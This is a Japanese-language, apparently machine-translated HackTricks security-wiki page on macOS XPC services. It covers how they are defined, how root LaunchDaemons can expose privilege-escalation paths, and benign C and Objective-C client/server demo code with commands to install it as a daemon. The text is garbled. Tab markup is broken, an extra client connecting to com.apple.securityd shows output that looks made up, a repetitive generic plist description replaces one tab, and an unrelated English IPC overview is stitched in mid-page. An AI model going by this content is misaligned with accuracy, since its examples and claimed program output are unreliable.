唯一の**欠点**は、アプリケーションを複数のプロセスに分割してXPCを介して通信させることは、**効率が低下する**ということです。しかし、現在のシステムではほとんど気づかれず、利点の方がはるかに優れています。

例として、QuickTime Playerでは、XPCを使用してビデオのデコードを担当するコンポーネントがあります。このコンポーネントは計算タスクを実行するために特別に設計されており、侵害された場合でも、ファイルやネットワークへのアクセスなど、攻撃者に有益な利得を提供しません。

### アプリケーション固有のXPCサービス

アプリケーションのXPCコンポーネントは、**アプリケーション自体の中にあります**。たとえば、Safariでは、**`/Applications/Safari.app/Contents/XPCServices`**にそれらを見つけることができます。拡張子は**`.xpc`**（例：**`com.apple.Safari.SandboxBroker.xpc`**）であり、**メインバイナリ**も**バンドル**されています：`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

XPCコンポーネントは、他のXPCコンポーネントやメインのアプリバイナリとは異なる**エンタイトルメントと特権**を持つ場合があります。ただし、XPCサービスが**Info.plist**ファイルで[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)を「True」に設定されている場合は除きます。この場合、XPCサービスは、それを呼び出したアプリケーションと同じセキュリティセッションで実行されます。

XPCサービスは、必要に応じて**launchd**によって**起動**され、すべてのタスクが**完了**した後に**シャットダウン**され、システムリソースを解放します。**アプリケーション固有のXPCコンポーネントは、アプリケーションのみが利用できる**ため、潜在的な脆弱性に関連するリスクを低減します。

### システム全体のXPCサービス

システム全体のXPCサービスは、すべてのユーザーがアクセスできます。これらのサービスは、launchdまたはMachタイプであり、**`/System/Library/LaunchDaemons`**、**`/Library/LaunchDaemons`**、**`/System/Library/LaunchAgents`**、または**`/Library/LaunchAgents`**などの指定されたディレクトリにあるplistファイルで定義する必要があります。

これらのplistファイルには、サービスの名前を持つ**`MachServices`**キーと、バイナリへのパスを持つ**`Program`**キーがあります。
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
**`LaunchDameons`**内のものはrootによって実行されます。したがって、特権を持たないプロセスがこれらのいずれかと通信できれば、特権を昇格させることができる可能性があります。

### XPCイベントメッセージ

アプリケーションは、異なるイベントメッセージに**サブスクライブ**することができ、そのようなイベントが発生したときに**オンデマンドで起動**することができます。これらのサービスのセットアップは、**`LaunchEvent`**キーを含む**`launchd plistファイル`**によって行われます。これらのファイルは、前述のものと同じディレクトリにあります。

### XPC接続プロセスのチェック

プロセスがXPC接続を介してメソッドを呼び出そうとするとき、**XPCサービスはそのプロセスが接続を許可されているかどうかをチェックする必要があります**。以下は、そのチェック方法と一般的な落とし穴です:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### XPC認証

Appleはまた、アプリが**いくつかの権限とその取得方法を設定**することも許可しています。したがって、呼び出し元のプロセスがこれらの権限を持っている場合、XPCサービスからのメソッドの呼び出しが**許可されます**。

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Cコードの例

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% tab title="xpc_client.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

int main(int argc, const char * argv[]) {
    xpc_connection_t connection = xpc_connection_create_mach_service("com.apple.securityd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        
        if (type == XPC_TYPE_DICTIONARY) {
            const char *description = xpc_dictionary_get_string(event, "description");
            printf("Received event: %s\n", description);
        }
    });
    
    xpc_connection_resume(connection);
    
    dispatch_main();
    
    return 0;
}
```

このコードは、`com.apple.securityd`という名前のMachサービスに接続するXPCクライアントを作成します。XPC接続は、プロセス間通信（IPC）メカニズムであり、macOSにおいてセキュリティイベントを受信するために使用されます。

`xpc_connection_create_mach_service`関数は、指定されたMachサービスに接続するためのXPC接続オブジェクトを作成します。第1引数にはMachサービスの名前、第2引数には接続の識別子（NULLの場合は新しい識別子が生成されます）、第3引数には接続の種類を指定します。`XPC_CONNECTION_MACH_SERVICE_PRIVILEGED`は、特権付きのMachサービスに接続するためのフラグです。

`xpc_connection_set_event_handler`関数は、指定されたXPC接続に対してイベントハンドラを設定します。イベントハンドラは、接続に関連するイベントが発生した際に呼び出されます。この例では、イベントがディクショナリ型である場合に、"description"キーに関連する文字列を取得し、それを出力します。

`xpc_connection_resume`関数は、指定されたXPC接続を開始します。

`dispatch_main`関数は、メインスレッドの実行ループを開始します。これにより、プログラムが終了するまでイベントの受信と処理が継続されます。

このコードをコンパイルして実行すると、`com.apple.securityd`から送信されるイベントの説明が表示されます。

```bash
$ gcc -o xpc_client xpc_client.c -lxpc
$ ./xpc_client
Received event: Security event occurred
Received event: Another security event occurred
...
```

{% endtab %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% tab title="xyz.hacktricks.service.plist" %}xyz.hacktricks.service.plistファイルは、macOSで実行されるサービスの設定ファイルです。このファイルは、サービスの起動時に使用されるパラメータや環境変数などの設定を含んでいます。このファイルを編集することで、サービスの動作をカスタマイズすることができます。

このファイルは、XML形式で記述されており、以下のような要素を含んでいます。

- Label: サービスの識別子として使用される文字列です。
- ProgramArguments: サービスの実行時に実行されるコマンドや引数のリストです。
- EnvironmentVariables: サービスの実行時に設定される環境変数のリストです。
- RunAtLoad: サービスの起動時に自動的に実行されるかどうかを指定します。
- KeepAlive: サービスが異常終了した場合に自動的に再起動するかどうかを指定します。

このファイルを編集する際には、注意が必要です。間違った設定を行うと、サービスの動作に影響を与える可能性があります。また、このファイルの変更は、管理者権限が必要な場合があります。

サービスの設定を変更する際には、事前にバックアップを作成することをおすすめします。また、変更後にサービスを再起動する必要がある場合があります。

このファイルの場所は、`/Library/LaunchDaemons`または`/Library/LaunchAgents`ディレクトリです。それぞれ、システム全体のサービスとユーザー固有のサービスの設定を含んでいます。

このファイルを編集することで、サービスの動作をカスタマイズすることができますが、慎重に行う必要があります。適切な設定を行わないと、セキュリティ上のリスクや予期しない動作が発生する可能性があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### ObjectiveCコードの例

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% tab title="oc_xpc_client.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows different processes to communicate with each other and share data. In macOS, there are several IPC mechanisms available, including:

- **Mach Ports**: Mach ports are the fundamental IPC mechanism in macOS. They allow processes to send messages and share resources.
- **UNIX Domain Sockets**: UNIX domain sockets provide a communication channel between processes on the same machine.
- **Distributed Objects**: Distributed objects allow objects to be shared between processes using the Objective-C runtime.
- **XPC**: XPC (eXtensible Procedure Call) is a lightweight IPC mechanism introduced in macOS 10.7. It allows processes to communicate with each other and perform remote procedure calls.

Understanding how IPC works in macOS is important for both security and privilege escalation. By exploiting vulnerabilities in IPC mechanisms, an attacker can gain unauthorized access to sensitive data or escalate their privileges.

In this section, we will explore different IPC mechanisms in macOS and discuss potential security vulnerabilities and privilege escalation techniques associated with them.

## Table of Contents

- [Mach Ports](mach-ports.md)
- [UNIX Domain Sockets](unix-domain-sockets.md)
- [Distributed Objects](distributed-objects.md)
- [XPC](xpc.md)

{% endtab %}

{% tab title="Untitled (翻訳)" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## 参考文献

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
